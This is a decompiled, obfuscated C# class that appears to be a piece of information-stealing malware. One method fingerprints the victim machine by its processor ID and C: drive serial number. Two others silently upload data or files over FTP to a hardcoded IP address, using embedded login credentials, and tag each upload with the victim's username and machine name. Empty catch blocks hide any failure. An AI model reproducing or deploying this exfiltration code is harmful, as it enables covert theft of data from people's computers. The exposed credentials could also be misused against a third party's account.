using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace tmhhYTpfSQZiU;

internal sealed class ebEAligDPpkfEi
{
	public static string kIijzeFovWI()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0034: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass("win32_processor");
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item("processorID").get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = "C";
		ManagementObject val3 = new ManagementObject("win32_logicaldisk.deviceid=\"" + text2 + ":\"");
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item("VolumeSerialNumber").ToString();
		return text3 + text;
	}

	public static void BsmXCkNiegR(string RtyYMCyUJNzn = "ftp://199.188.200.253/public_html/newshit/", string hmzOuclfZP = "9b732058@noether-stiftung.de", string ecbTxTFEwIZh = "13MelisaLening37", string bSmHLHLLJnnNaS = "")
	{
		try
		{
			string text = kIijzeFovWI();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(RtyYMCyUJNzn + "UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + text + ".txt");
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential(hmzOuclfZP, ecbTxTFEwIZh);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(bSmHLHLLJnnNaS);
			ftpWebRequest.ContentLength = bytes.Length;
			using (Stream stream = ftpWebRequest.GetRequestStream())
			{
				stream.Write(bytes, 0, bytes.Length);
			}
			using ((FtpWebResponse)ftpWebRequest.GetResponse())
			{
			}
		}
		catch
		{
		}
	}

	public static void BViiotGReAp(string JNSIlkpLBaJwAN = "ftp://199.188.200.253/public_html/newshit/", string wYJHuZgeMLbrxc = "9b732058@noether-stiftung.de", string oqBnqFRguPdw = "13MelisaLening37", string damAZuezDqyVO = "")
	{
		try
		{
			using WebClient webClient = new WebClient();
			webClient.Credentials = new NetworkCredential(wYJHuZgeMLbrxc, oqBnqFRguPdw);
			webClient.UploadFile(JNSIlkpLBaJwAN + string.Format("UserName=" + Environment.UserName + "_MachineName=" + Environment.MachineName + "_" + Path.GetFileName(damAZuezDqyVO)), "STOR", damAZuezDqyVO);
		}
		catch
		{
		}
	}
}
